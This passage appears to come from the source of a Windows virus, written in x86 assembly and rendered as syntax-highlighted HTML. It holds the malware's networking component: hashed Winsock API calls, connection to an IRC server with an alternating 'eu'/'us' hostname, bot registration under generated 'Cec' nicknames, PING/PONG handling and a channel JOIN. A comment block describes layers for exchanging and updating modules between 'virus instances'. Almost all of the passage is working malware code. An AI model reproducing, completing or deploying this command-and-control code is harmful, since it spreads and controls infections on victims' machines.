                </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sin_addr</span><span class="sc4">,</span><span class="sc5">icn4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">16</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">sin</span><span class="sc4">,</span><span class="sc5">icn5</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">icc9</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">C_apicall</span><span class="sc0">       </span><span class="sc2">0E5AC660h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">    </span><span class="sc1">; connect</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; SOCKET_ERROR</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ic_finish2</span><span class="sc0">      
        
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc0">       </span><span class="sc1">; FD_READ + FD_CLOSE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_SOCKET</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; 1st arg in</span><span class="sc0">
                                </span><span class="sc1">; stack</span><span class="sc0">
                </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">icc7</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">03E7B093h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">  </span><span class="sc1">; WsaAsyncSelect</span><span class="sc0">
            
                                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'OKAY'</span><span class="sc0">
                                </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">ic_finish2</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sock</span><span class="sc0">
    </span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">0F9AAA3C4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">              </span><span class="sc1">; closesocket</span><span class="sc0">

</span><span class="sc5">ic_finish1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">C_apicall</span><span class="sc0">  </span><span class="sc2">0A3498CD8h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                    </span><span class="sc1">; WSACleanup</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">layer1uninit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">icn91</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">0F9AAA3C4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">              </span><span class="sc1">; closesocket</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">0A3498CD8h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; WSACleanup</span><span class="sc0">

</span><span class="sc5">coocooom</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">hostname</span><span class="sc4">,</span><span class="sc5">icn92</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'ue'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">swapittoeu</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'su'</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">swapittous</span><span class="sc0">

</span><span class="sc5">swapittoeu</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'ue'</span><span class="sc0">

</span><span class="sc5">swapittous</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">            </span><span class="sc2">30000</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">3126C0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">initconnect</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'OKAY'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">coocooom</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">layer2init</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Message1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc12">'NICK Cec0000'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">finmes1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Message2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc12">'user Cec0000 "" "" :Cec0000'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">finmes2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Mes3chk</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Message3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'USERHOST Cec0000'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">finmes3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">layer2init</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">17357e7Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; GetTickCount</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'!CeC'</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">getitmax</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getitmax</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc5">ly2</span><span class="sc0">
</span><span class="sc1">;cmp        dword ptr [edx+8],'0000'</span><span class="sc0">
</span><span class="sc1">;jne        skipIdFilling</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'0ceC'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">Message2</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'0ceC'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">Message2</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">23</span><span class="sc4">+</span><span class="sc5">Message2</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'0ceC'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">23</span><span class="sc4">+</span><span class="sc5">Message2</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc5">Message3</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'0ceC'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc5">Message3</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00FFFFFFh</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">Message2</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">23</span><span class="sc4">+</span><span class="sc5">Message2</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc5">Message3</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">skipIdFilling</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">finmes1</span><span class="sc4">-</span><span class="sc5">Message1</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc5">sif76</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">sif1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">818A0h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">finmes2</span><span class="sc4">-</span><span class="sc5">Message2</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Message2</span><span class="sc4">,</span><span class="sc5">sif2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">sif31</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">818A0h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; send</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'OKAY'</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">layer2interp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">recdata</span><span class="sc4">,</span><span class="sc5">ly2int</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">layer2interp1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">lly2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'GNIP'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notpong</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'O'</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">getendofline</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">sif9</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">818A0h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; send</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0A0Dh</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Mes3chk</span><span class="sc4">,</span><span class="sc5">ly114</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipitMes3</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">finmes3</span><span class="sc4">-</span><span class="sc5">Message3</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Message3</span><span class="sc4">,</span><span class="sc5">sif8</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">sif99</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">818A0h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; send</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; elle reflte l'tat de mon esprit</span><span class="sc0">
</span><span class="sc1">; viscicitude et aspiration matrielle dchue</span><span class="sc0">
</span><span class="sc1">; n'est que frustration une vie bientt teinte...</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">InitManage</span><span class="sc0">

</span><span class="sc5">skipitMes3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">notpong</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">Managing</span><span class="sc0">

</span><span class="sc5">loadnextline</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">getnextline</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishloading</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0A0Dh</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getnextline</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dontfinishloading</span><span class="sc0">

</span><span class="sc5">finishloading</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dontfinishloading</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">layer2interp1</span><span class="sc0">

</span><span class="sc5">getendofline</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">getendofline1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0A0Dh</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getendofline1</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Multi layer networking:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Layer 1 - Wich call winsock functions in order to connect and receive</span><span class="sc0">
</span><span class="sc1">;         sent datas as they arrive</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Layer 2 - initialise and interprete the protocol used in layer1</span><span class="sc0">
</span><span class="sc1">;       - Interprete data from Layer 3 and send to layer 1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Layer 3 - load data from Layer 2 and interprete for Layer 4</span><span class="sc0">
</span><span class="sc1">;         Interprete data from Layer 4 and send to layer 2</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   Layer 4 - interprete and send data to Layer 2</span><span class="sc0">
</span><span class="sc1">;         manage communication between two virus hinstances and </span><span class="sc0">
</span><span class="sc1">;         display their module list version, then ask if any module</span><span class="sc0">
</span><span class="sc1">;         need to be updated</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Layer 5 - exchange module connection, have packet checksum, divide</span><span class="sc0">
</span><span class="sc1">;         packet, encryption, end crc check and resend operation </span><span class="sc0">
</span><span class="sc1">;         aivable, have also a ping timeout check, don't flood </span><span class="sc0">
</span><span class="sc1">;         (limited to 200 byte/s). Well, module are limited to 8192 </span><span class="sc0">
</span><span class="sc1">;         kilobytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">cecuser</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">message4</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'JOIN '</span><span class="sc0">
